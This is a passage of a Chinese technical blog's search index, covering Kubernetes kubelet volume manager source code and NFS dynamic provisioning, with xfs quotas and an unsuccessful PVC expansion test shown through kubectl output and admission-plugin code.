mounted, despite call to unmount(). Will try again next sync loop.\", dir) return err } } os.Remove(dir) return err } return nil } func (plugin *nfsPlugin) newMounterInternal(spec *volume.Spec, pod *v1.Pod, mounter mount.Interface) (volume.Mounter, error) { source, readOnly, err := getVolumeSource(spec) if err != nil { return nil, err } return \u0026nfsMounter{ nfs: \u0026nfs{ volName: spec.Name(), mounter: mounter, pod: pod, plugin: plugin, MetricsProvider: volume.NewMetricsStatFS(getPath(pod.UID, spec.Name(), plugin.host)), }, server: source.Server, exportPath: source.Path, readOnly: readOnly, mountOptions: util.MountOptionFromSpec(spec), }, nil } // Name returns the name of either Volume or PersistentVolume, one of which must not be nil. func (spec *Spec) Name() string { switch { case spec.Volume != nil: return spec.Volume.Name case spec.PersistentVolume != nil: return spec.PersistentVolume.Name default: return \"\" } } // NFS volumes represent a bare host file or directory mount of an NFS export. type nfs struct { volName string pod *v1.Pod mounter mount.Interface plugin *nfsPlugin volume.MetricsProvider } func (nfsVolume *nfs) GetPath() string { name := nfsPluginName // GetPodVolumeDir returns the absolute path a directory which // represents the named volume under the named plugin for the given // pod. If the specified pod does not exist, the result of this call // might not exist. return nfsVolume.plugin.host.GetPodVolumeDir(nfsVolume.pod.UID, utilstrings.EscapeQualifiedName(name), nfsVolume.volName) } ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:0","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"Kueblet SyncPod ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:0","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"SyncPod上下文 这里先回顾下pod容器创建准备过程，粗体标注为volume相关的处理。 完成创建容器前的准备工作（SyncPod） 在这个方法中，主要完成以下几件事情： 如果是删除 pod，立即执行并返回 同步 podStatus 到 kubelet.statusManager 检查 pod 是否能运行在本节点，主要是权限检查（是否能使用主机网络模式，是否可以以 privileged 权限运行等）。如果没有权限，就删除本地旧的 pod 并返回错误信息 创建 containerManagar 对象，并且创建 pod level cgroup，更新 Qos level cgroup 如果是 static Pod，就创建或者更新对应的 mirrorPod 创建 pod 的数据目录，存放 volume 和 plugin 信息,如果定义了 pv，等待所有的 volume mount 完成（volumeManager 会在后台做这些事情）,如果有 image secrets，去 apiserver 获取对应的 secrets 数据 然后调用 kubelet.volumeManager 组件，等待它将 pod 所需要的所有外挂的 volume 都准备好。 调用 container runtime 的 SyncPod 方法，去实现真正的容器创建逻辑 这里所有的事情都和具体的容器没有关系，可以看到该方法是创建 pod 实体（即容器）之前需要完成的准备工作。 func (kl *Kubelet) syncPod(o syncPodOptions) error { // pull out the required options pod := o.pod mirrorPod := o.mirrorPod podStatus := o.podStatus updateType := o.updateType // 是否为 删除 pod if updateType == kubetypes.SyncPodKill { ... } ... // 检查 pod 是否能运行在本节点 runnable := kl.canRunPod(pod) if !runnable.Admit { ... } // 更新 pod 状态 kl.statusManager.SetPodStatus(pod, apiPodStatus) // 如果 pod 非 running 状态则直接 kill 掉 if !runnable.Admit || pod.DeletionTimestamp != nil || apiPodStatus.Phase == v1.PodFailed { ... } // 加载网络插件 if rs := kl.runtimeState.networkErrors(); len(rs) != 0 \u0026\u0026 !kubecontainer.IsHostNetworkPod(pod) { ... } pcm := kl.containerManager.NewPodContainerManager() if !kl.podIsTerminated(pod) { ... // 创建并更新 pod 的 cgroups if !(podKilled \u0026\u0026 pod.Spec.RestartPolicy == v1.RestartPolicyNever) { if !pcm.Exists(pod) { ... } } } // 为 static pod 创建对应的 mirror pod if kubepod.IsStaticPod(pod) { ... } // 创建数据目录 if err := kl.makePodDataDirs(pod); err != nil { ... } // 挂载 volume if !kl.podIsTerminated(pod) { if err := kl.volumeManager.WaitForAttachAndMount(pod); err != nil { ... } } // 获取 secret 信息 pullSecrets := kl.getPullSecretsForPod(pod) // 调用 containerRuntime 的 SyncPod 方法开始创建容器 result := kl.containerRuntime.SyncPod(pod, apiPodStatus, podStatus, pullSecrets, kl.backOff) kl.reasonCache.Update(pod.UID, result) if err := result.Error(); err != nil { ... } return nil } 在上面的上下文中，看到了kubelet的syncpod处理，同步 pod 时，等待 pod attach 和 mount 完成 func (kl *Kubelet) syncPod(o syncPodOptions) error { // 挂载 volume if !kl.podIsTerminated(pod) { if err := kl.volumeManager.WaitForAttachAndMount(pod); err != nil { ... } } } ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:1","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"WaitForAttachAndMount func (vm *volumeManager) WaitForAttachAndMount(pod *v1.Pod) error { if pod == nil { return nil } // pod的全部挂载卷 expectedVolumes := getExpectedVolumes(pod) if len(expectedVolumes) == 0 { // No volumes to verify return nil } klog.V(3).Infof(\"Waiting for volumes to attach and mount for pod %q\", format.Pod(pod)) uniquePodName := util.GetUniquePodName(pod) // Some pods expect to have Setup called over and over again to update. // Remount plugins for which this is true. (Atomically updating volumes, // like Downward API, depend on this to update the contents of the volume). vm.desiredStateOfWorldPopulator.ReprocessPod(uniquePodName) err := wait.PollImmediate( podAttachAndMountRetryInterval, podAttachAndMountTimeout, vm.verifyVolumesMountedFunc(uniquePodName, expectedVolumes)) if err != nil { unmountedVolumes := vm.getUnmountedVolumes(uniquePodName, expectedVolumes) // Also get unattached volumes for error message unattachedVolumes := vm.getUnattachedVolumes(expectedVolumes) // 没有被 mount 的volume 数量为0，表示成功完成挂载 if len(unmountedVolumes) == 0 { return nil } return fmt.Errorf( \"unmounted volumes=%v, unattached volumes=%v: %s\", unmountedVolumes, unattachedVolumes, err) } klog.V(3).Infof(\"All volumes are attached and mounted for pod %q\", format.Pod(pod)) return nil } ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:2","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"verifyVolumesMountedFunc 没有被 mount 的volume 数量为0，表示成功完成挂载 UnmountedVolumes = expectedVolumes - mountedVolumes // verifyVolumesMountedFunc returns a method that returns true when all expected // volumes are mounted. func (vm *volumeManager) verifyVolumesMountedFunc(podName types.UniquePodName, expectedVolumes []string) wait.ConditionFunc { return func() (done bool, err error) { if errs := vm.desiredStateOfWorld.PopPodErrors(podName); len(errs) \u003e 0 { return true, errors.New(strings.Join(errs, \"; \")) } return len(vm.getUnmountedVolumes(podName, expectedVolumes)) == 0, nil } } // getUnmountedVolumes fetches the current list of mounted volumes from // the actual state of the world, and uses it to process the list of // expectedVolumes. It returns a list of unmounted volumes. // The list also includes volume that may be mounted in uncertain state. func (vm *volumeManager) getUnmountedVolumes(podName types.UniquePodName, expectedVolumes []string) []string { mountedVolumes := sets.NewString() for _, mountedVolume := range vm.actualStateOfWorld.GetMountedVolumesForPod(podName) { // 实际的挂载卷 mountedVolumes.Insert(mountedVolume.OuterVolumeSpecName) } // expectedVolumes为pod的全部挂载卷 // UnmountedVolumes = expectedVolumes - mountedVolumes return filterUnmountedVolumes(mountedVolumes, expectedVolumes) } ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:3","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"参考资料 kubelet源码分析之volume manager源码分析 kubelet 创建 pod 的流程 ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:0","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"k8s dynamic provisioning and storage 介绍","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"动态pv存储供应（k8s dynamic provisioning and storage） 和 nfs-server-provisioner 原理介绍和功能验证 ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:0:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"设计说明 Storage is a critical part of running containers, and Kubernetes offers some powerful primitives for managing it. Dynamic volume provisioning, a feature unique to Kubernetes, allows storage volumes to be created on-demand. Without dynamic provisioning, cluster administrators have to manually make calls to their cloud or storage provider to create new storage volumes, and then create PersistentVolume objects to represent them in Kubernetes. The dynamic provisioning feature eliminates the need for cluster administrators to pre-provision storage. Instead, it automatically provisions storage when it is requested by users. This feature was introduced as alpha in Kubernetes 1.2, and has been improved and promoted to beta in the latest release, 1.4. This release makes dynamic provisioning far more flexible and useful. ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:1:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"What’s New? The alpha version of dynamic provisioning only allowed a single, hard-coded provisioner to be used in a cluster at once. This meant that when Kubernetes determined storage needed to be dynamically provisioned, it always used the same volume plugin to do provisioning, even if multiple storage systems were available on the cluster. The provisioner to use was inferred based on the cloud environment - EBS for AWS, Persistent Disk for Google Cloud, Cinder for OpenStack, and vSphere Volumes on vSphere. Furthermore, the parameters used to provision new storage volumes were fixed: only the storage size was configurable. This meant that all dynamically provisioned volumes would be identical, except for their storage size, even if the storage system exposed other parameters (such as disk type) for configuration during provisioning. Although the alpha version of the feature was limited in utility, it allowed us to “get some miles” on the idea, and helped determine the direction we wanted to take. The beta version of dynamic provisioning, new in Kubernetes 1.4, introduces a new API object, StorageClass. Multiple StorageClass objects can be defined each specifying a volume plugin (aka provisioner) to use to provision a volume and the set of parameters to pass to that provisioner when provisioning. This design allows cluster administrators to define and expose multiple flavors of storage (from the same or different storage systems) within a cluster, each with a custom set of parameters. This design also ensures that end users don’t have to worry about the complexity and nuances of how storage is provisioned, but still have the ability to select from multiple storage options. Dynamic Provisioning and Storage Classes in Kubernetes 说明： 管理员只需要按存储类型，预置一些strorage class资源配置（可以理解为创建pv的模板），不需要为每个pvc声明手动创建pv 用户按所需strorage class，创建pvc，则系统（这里指的是nfs provisoner）会根据pvc信息，自动创建pv并进行绑定 当用户pod删除时，根据需要删除pvc，则绑定的pv会自动关联删除 ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:1:1","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"provisioner、pv、pvc 图 ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:2:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"资源视图 ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:2:1","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"交互视图 搭建StorageClass+NFS,大致有以下几个步骤: 创建一个可用的NFS Serve 创建Service Account.这是用来管控NFS provisioner在k8s集群中运行的权限 创建StorageClass.负责建立PVC并调用NFS provisioner进行预定的工作,并让PV与PVC建立管理 创建NFS provisioner.有两个功能,一个是在NFS共享目录下创建挂载点(volume),另一个则是建了PV并将PV与NFS的挂载点建立关联 ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:2:2","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"nfs-provisioner项目 新代码项目地址：https://github.com/kubernetes-sigs/nfs-ganesha-server-and-external-provisioner 老项目地址（不再使用）https://github.com/kubernetes-retired/external-storage/tree/master/nfs 可使用quay.io/kubernetes_incubator/nfs-provisioner镜像 ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:2:3","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"nfs-provisioner镜像 docker pull quay.io/kubernetes_incubator/nfs-provisioner docker save quay.io/kubernetes_incubator/nfs-provisioner:latest -o nfs-provisioner.img.tar ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:3:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"Arguments provisioner - Name of the provisioner. The provisioner will only provision volumes for claims that request a StorageClass with a provisioner field set equal to this name. master - Master URL to build a client config from. Either this or kubeconfig needs to be set if the provisioner is being run out of cluster. kubeconfig - Absolute path to the kubeconfig file. Either this or master needs to be set if the provisioner is being run out of cluster. run-server - If the provisioner is responsible for running the NFS server, i.e. starting and stopping NFS Ganesha. Default true. use-ganesha - If the provisioner will create volumes using NFS Ganesha (D-Bus method calls) as opposed to using the kernel NFS server (‘exportfs’). If run-server is true, this must be true. Default true. grace-period - NFS Ganesha grace period to use in seconds, from 0-180. If the server is not expected to survive restarts, i.e. it is running as a pod \u0026 its export directory is not persisted, this can be set to 0. Can only be set if both run-server and use-ganesha are true. Default 90. enable-xfs-quota - If the provisioner will set xfs quotas for each volume it provisions. Requires that the directory it creates volumes in ('/export') is xfs mounted with option prjquota/pquota, and that it has the privilege to run xfs_quota. Default false. failed-retry-threshold - If the number of retries on provisioning failure need to be limited to a set number of attempts. Default 10 server-hostname - The hostname for the NFS server to export from. Only applicable when running out-of-cluster i.e. it can only be set if either master or kubeconfig are set. If unset, the first IP output by hostname -i is used. device-based-fsids - If file system handles created by NFS Ganesha should be based on major/minor device IDs of the backing storage volume ('/export'). When running a cloud based kubernetes service (like Googles GKE service) set this to false as it might affect client connections on restarts of the nfs provisioner pod. Default true. ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:4:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"存储配额 ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:5:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"nfs provisioner xfsQuotaer 通过添加project到目标目录的方式来设置配额大小 实际上还是通过xfsQuotaer 实现 // createQuota creates a quota for the directory by adding a project to // represent the directory and setting a quota on it func (p *nfsProvisioner) createQuota(directory string, capacity resource.Quantity) (string, uint16, error) { path := path.Join(p.exportDir, directory) limit := strconv.FormatInt(capacity.Value(), 10) block, projectID, err := p.quotaer.AddProject(path, limit) if err != nil { return \"\", 0, fmt.Errorf(\"error adding project for path %s: %v\", path, err) } err = p.quotaer.SetQuota(projectID, path, limit) if err != nil { p.quotaer.RemoveProject(block, projectID) return \"\", 0, fmt.Errorf(\"error setting quota for path %s: %v\", path, err) } return block, projectID, nil } XfsQuotaer 需要系统配置 xfs文件系统挂载参数 prjquota 或则 pquota 参数 type xfsQuotaer struct { xfsPath string // The file where we store mappings between project ids and directories, and // each project's quota limit information, for backup. // Similar to http://man7.org/linux/man-pages/man5/projects.5.html projectsFile string projectIDs map[uint16]bool mapMutex *sync.Mutex fileMutex *sync.Mutex } // NewNFSProvisioner creates a Provisioner that provisions NFS PVs backed by // the given directory. func NewNFSProvisioner(exportDir string, client kubernetes.Interface, outOfCluster bool, useGanesha bool, ganeshaConfig string, enableXfsQuota bool, serverHostname string, maxExports int, exportSubnet string) controller.Provisioner { var quotaer quotaer var err error // 当XfsQuota功能开启时，才能进行配额 if enableXfsQuota { quotaer, err = newXfsQuotaer(exportDir) if err != nil { glog.Fatalf(\"Error creating xfs quotaer! %v\", err) } } else { quotaer = newDummyQuotaer() } } // 构造XfsQuotaer unc newXfsQuotaer(xfsPath string) (*xfsQuotaer, error) { if _, err := os.Stat(xfsPath); os.IsNotExist(err) { return nil, fmt.Errorf(\"xfs path %s does not exist\", xfsPath) } isXfs, err := isXfs(xfsPath) if err != nil { return nil, fmt.Errorf(\"error checking if xfs path %s is an XFS filesystem: %v\", xfsPath, err) } if !isXfs { return nil, fmt.Errorf(\"xfs path %s is not an XFS filesystem\", xfsPath) } entry, err := getMountEntry(path.Clean(xfsPath), \"xfs\") if err != nil { return nil, err } // XfsQuotaer 需要系统配置 xfs文件系统挂载参数 prjquota 或则 pquota 参数 if !strings.Contains(entry.VfsOpts, \"pquota\") \u0026\u0026 !strings.Contains(entry.VfsOpts, \"prjquota\") { return nil, fmt.Errorf(\"xfs path %s was not mounted with pquota nor prjquota\", xfsPath) } _, err = exec.LookPath(\"xfs_quota\") if err != nil { return nil, err } projectsFile := path.Join(xfsPath, \"projects\") projectIDs := map[uint16]bool{} _, err = os.Stat(projectsFile) if os.IsNotExist(err) { file, cerr := os.Create(projectsFile) if cerr != nil { return nil, fmt.Errorf(\"error creating xfs projects file %s: %v\", projectsFile, cerr) } file.Close() } else { re := regexp.MustCompile(\"(?m:^([0-9]+):/.+$)\") projectIDs, err = getExistingIDs(projectsFile, re) if err != nil { glog.Errorf(\"error while populating projectIDs map, there may be errors setting quotas later if projectIDs are reused: %v\", err) } } xfsQuotaer := \u0026xfsQuotaer{ xfsPath: xfsPath, projectsFile: projectsFile, projectIDs: projectIDs, mapMutex: \u0026sync.Mutex{}, fileMutex: \u0026sync.Mutex{}, } return xfsQuotaer, nil } ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:5:1","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"配额扩容 在storageclass和k8s的默认配置下，通过修改pvc配置文件claim.yaml的配额大小，会报错，报错信息如下。 [root@node131 nfs]# vi deploy/kubernetes_incubator_nfs_provisioner/claim.yaml [root@node131 nfs]# 编辑size大小 [root@node131 nfs]# [root@node131 nfs]# kubectl apply -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml Warning: resource persistentvolumeclaims/nfs is missing the kubectl.kubernetes.io/last-applied-configuration annotation which is required by kubectl apply. kubectl apply should only be used on resources created declaratively by either kubectl create --save-config or kubectl apply. The missing annotation will be patched automatically. Error from server (Forbidden): error when applying patch: {\"metadata\":{\"annotations\":{\"kubectl.kubernetes.io/last-applied-configuration\":\"{\\\"apiVersion\\\":\\\"v1\\\",\\\"kind\\\":\\\"PersistentVolumeClaim\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"name\\\":\\\"nfs\\\",\\\"namespace\\\":\\\"default\\\"},\\\"spec\\\":{\\\"accessModes\\\":[\\\"ReadWriteMany\\\"],\\\"resources\\\":{\\\"requests\\\":{\\\"storage\\\":\\\"5Mi\\\"}},\\\"storageClassName\\\":\\\"example-nfs\\\"}}\\n\"}},\"spec\":{\"resources\":{\"requests\":{\"storage\":\"5Mi\"}}}} to: Resource: \"/v1, Resource=persistentvolumeclaims\", GroupVersionKind: \"/v1, Kind=PersistentVolumeClaim\" Name: \"nfs\", Namespace: \"default\" for: \"deploy/kubernetes_incubator_nfs_provisioner/claim.yaml\": persistentvolumeclaims \"nfs\" is forbidden: only dynamically provisioned pvc can be resized and the storageclass that provisions the pvc must support resize [root@node131 nfs]# 参考文档说明内容如下： StorageClass允许卷扩容 FEATURE STATE: Kubernetes v1.11 [beta] PersistentVolume 可以配置为可扩容。将此功能设置为 true 时，允许用户通过编辑相应的 PVC 对象来调整卷大小。 当下层 StorageClass 的 allowVolumeExpansion 字段设置为 true 时，以下类型的卷支持卷扩展。 此功能仅可用于扩容卷，不能用于缩小卷。 注意，文档中没有说明nfs卷可以扩容，需要测试验证，测试验证如下 编辑 StorageClass ，添加 allowVolumeExpansion kind:StorageClassapiVersion:storage.k8s.io/v1metadata:name:example-nfsprovisioner:example.com/nfs# 允许卷扩容allowVolumeExpansion:truemountOptions:- vers=4.1 执行更新扩容为5M操作，发现pvc仍未更新 查看pvc的打印，如下 [root@node131 nfs]# kubectl apply -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml persistentvolumeclaim/nfs unchanged [root@node131 nfs]# kubectl describe pvc Name: nfs Namespace: default StorageClass: example-nfs Status: Bound Volume: pvc-1f9f7ceb-6ca8-453e-87a0-013e53841fad Labels: \u003cnone\u003e Annotations: pv.kubernetes.io/bind-completed: yes pv.kubernetes.io/bound-by-controller: yes volume.beta.kubernetes.io/storage-provisioner: example.com/nfs Finalizers: [kubernetes.io/pvc-protection] Capacity: 1Mi Access Modes: RWX VolumeMode: Filesystem Used By: \u003cnone\u003e Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning ExternalExpanding 40m volume_expand Ignoring the PVC: didn't find a plugin capable of expanding the volume; waiting for an external controller to process this PVC. Warning ExternalExpanding 2m52s volume_expand Ignoring the PVC: didn't find a plugin capable of expanding the volume; waiting for an external controller to process this PVC. [root@node131 nfs]# 根据上面 提示，查看controller是否处理了pvc resize操作。 查看kube-controller的打印，如下 I0223 07:31:30.381326 1 expand_controller.go:277] Ignoring the PVC \"default/nfs\" (uid: \"1f9f7ceb-6ca8-453e-87a0-013e53841fad\") : didn't find a plugin capable of expanding the volume; waiting for an external controller to process this PVC. I0223 07:31:30.381389 1 event.go:291] \"Event occurred\" object=\"default/nfs\" kind=\"PersistentVolumeClaim\" apiVersion=\"v1\" type=\"Warning\" reason=\"ExternalExpanding\" message=\"Ignoring the PVC: didn't find a plugin capable of expanding the volume; waiting for an external controller to process this PVC.\" 原因 nfs并不支持在线动态扩容操作，即在storageclass条件下，通过修改pvc，同步联动修改pv 说明： k8s从1.8版本开始支持PV扩容操作。目前glusterfs、rbd等几种存储类型已经支持扩容操作，按官方文档并未包含nfs存储。 PV支持扩容需要满足两个条件： PersistentVolumeClaimResize插件使能，apiserver启动参数 –enable-admission-plugins中添加 PersistentVolumeClaimResize StorageClass allowVolumeExpansion设置为true 当这两个条件达到之后，用户可以修改PVC的大小从而驱动底层PV的扩容操作。对于包含文件系统的PV，只有当新Pod启动并且以读写模式挂载该PV时才完成文件系统扩容。也就是说，当PV已经挂载在某个Pod时，需要重启该Pod才能完成文件系统扩容。目前支持支持扩容的文件系统包括Ext3/Ext4、XFS。 以上内容总结","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:5:2","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"apiserver 参数样例 [root@node131 manifests]# cat kube-apiserver.yamlapiVersion:v1kind:Podmetadata:annotations:kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint:192.168.182.131:6443creationTimestamp:nulllabels:component:kube-apiservertier:control-planename:kube-apiservernamespace:kube-systemspec:containers:- command:- kube-apiserver- --advertise-address=192.168.182.131- --allow-privileged=true- --anonymous-auth=True- --apiserver-count=1- --authorization-mode=Node,RBAC- --bind-address=0.0.0.0- --client-ca-file=/etc/kubernetes/ssl/ca.crt#- --enable-admission-plugins=NodeRestriction- --enable-admission-plugins=\"NodeRestriction,PersistentVolumeClaimResize\"... ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:5:3","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"参考代码 kube apiserver 需要开启volume扩容插件 resize.PluginName, // PersistentVolumeClaimResize // AllOrderedPlugins is the list of all the plugins in order. var AllOrderedPlugins = []string{ admit.PluginName, // AlwaysAdmit autoprovision.PluginName, // NamespaceAutoProvision lifecycle.PluginName, // NamespaceLifecycle exists.PluginName, // NamespaceExists scdeny.PluginName, // SecurityContextDeny antiaffinity.PluginName, // LimitPodHardAntiAffinityTopology limitranger.PluginName, // LimitRanger serviceaccount.PluginName, // ServiceAccount noderestriction.PluginName, // NodeRestriction nodetaint.PluginName, // TaintNodesByCondition alwayspullimages.PluginName, // AlwaysPullImages imagepolicy.PluginName, // ImagePolicyWebhook podsecuritypolicy.PluginName, // PodSecurityPolicy podnodeselector.PluginName, // PodNodeSelector podpriority.PluginName, // Priority defaulttolerationseconds.PluginName, // DefaultTolerationSeconds podtolerationrestriction.PluginName, // PodTolerationRestriction exec.DenyEscalatingExec, // DenyEscalatingExec exec.DenyExecOnPrivileged, // DenyExecOnPrivileged eventratelimit.PluginName, // EventRateLimit extendedresourcetoleration.PluginName, // ExtendedResourceToleration label.PluginName, // PersistentVolumeLabel setdefault.PluginName, // DefaultStorageClass storageobjectinuseprotection.PluginName, // StorageObjectInUseProtection gc.PluginName, // OwnerReferencesPermissionEnforcement resize.PluginName, // PersistentVolumeClaimResize runtimeclass.PluginName, // RuntimeClass certapproval.PluginName, // CertificateApproval certsigning.PluginName, // CertificateSigning certsubjectrestriction.PluginName, // CertificateSubjectRestriction defaultingressclass.PluginName, // DefaultIngressClass // new admission plugins should generally be inserted above here // webhook, resourcequota, and deny plugins must go at the end mutatingwebhook.PluginName, // MutatingAdmissionWebhook validatingwebhook.PluginName, // ValidatingAdmissionWebhook resourcequota.PluginName, // ResourceQuota deny.PluginName, // AlwaysDeny } const ( // PluginName is the name of pvc resize admission plugin PluginName = \"PersistentVolumeClaimResize\" ) func (pvcr *persistentVolumeClaimResize) Validate(ctx context.Context, a admission.Attributes, o admission.ObjectInterfaces) error { if a.GetResource().GroupResource() != api.Resource(\"persistentvolumeclaims\") { return nil } if len(a.GetSubresource()) != 0 { return nil } pvc, ok := a.GetObject().(*api.PersistentVolumeClaim) // if we can't convert then we don't handle this object so just return if !ok { return nil } oldPvc, ok := a.GetOldObject().(*api.PersistentVolumeClaim) if !ok { return nil } oldSize := oldPvc.Spec.Resources.Requests[api.ResourceStorage] newSize := pvc.Spec.Resources.Requests[api.ResourceStorage] if newSize.Cmp(oldSize) \u003c= 0 { return nil } if oldPvc.Status.Phase != api.ClaimBound { return admission.NewForbidden(a, fmt.Errorf(\"Only bound persistent volume claims can be expanded\")) } // Growing Persistent volumes is only allowed for PVCs for which their StorageClass // explicitly allows it if !pvcr.allowResize(pvc, oldPvc) { return admission.NewForbidden(a, fmt.Errorf(\"only dynamically provisioned pvc can be resized and \"+ \"the storageclass that provisions the pvc must support resize\")) } return nil } // Growing Persistent volumes is only allowed for PVCs for which their StorageClass // explicitly allows it. func (pvcr *persistentVolumeClaimResize) allowResize(pvc, oldPvc *api.PersistentVolumeClaim) bool { pvcStorageClass := apihelper.GetPersistentVolumeClaimClass(pvc) oldPvcStorageClass := apihelper.GetPersistentVolumeClaimClass(oldPvc) if pvcStorageClass == \"\" || oldPvcStorageClass == \"\" || pvcStorageClass != oldPvcStorageClass { return false } sc, err := pvcr.scLister.Get(pvcStorageClass) if err != nil { return false } if sc.AllowVolumeExpansion != nil { return *sc.AllowVolumeExpansion } return false } controller相关代码 didn’t find a plugin capable of expanding the volume volumePlugin, err := exp","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:5:4","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"nfs-provisioner deploy说明 deployment说明 